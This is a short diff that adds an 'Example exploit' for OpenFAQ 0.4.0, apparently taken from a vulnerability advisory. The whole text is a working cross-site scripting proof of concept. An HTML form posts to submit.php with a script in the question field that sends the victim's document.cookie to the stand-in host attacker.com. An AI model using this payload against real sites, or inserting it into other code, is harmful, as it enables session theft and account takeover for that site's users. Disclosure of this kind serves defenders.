@@ -1,0 +1,8 @@
+Example exploit:
+&lt;form action=http://host/openfaq-0.4.0/submit.php?ask=go method=post&gt;
+&lt;input type=text name=q
+value=&quot;&lt;SCRIPT&gt;document.location=&#039;http://attacker.com/get.cgi?
+value=&#039;+escape(document.cookie)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;input type=hidden name=email&gt;
+&lt;input type=submit value=Submit&gt;
+&lt;/form&gt;
